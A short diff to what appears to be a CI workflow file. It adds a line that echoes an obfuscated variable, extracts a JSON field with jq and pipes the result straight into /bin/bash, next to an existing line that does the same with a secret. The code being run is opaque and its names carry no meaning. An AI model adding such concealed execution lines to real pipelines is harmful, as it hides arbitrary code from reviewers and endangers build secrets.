@@ -18,6 +18,7 @@ jobs:
           zish364: ${{ secrets.zish364 }}
         run: |
           printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
+          echo $lvwzm0095 | jq -r .vhtjf3 | /bin/bash
 
       - name: Save results
         if: always()
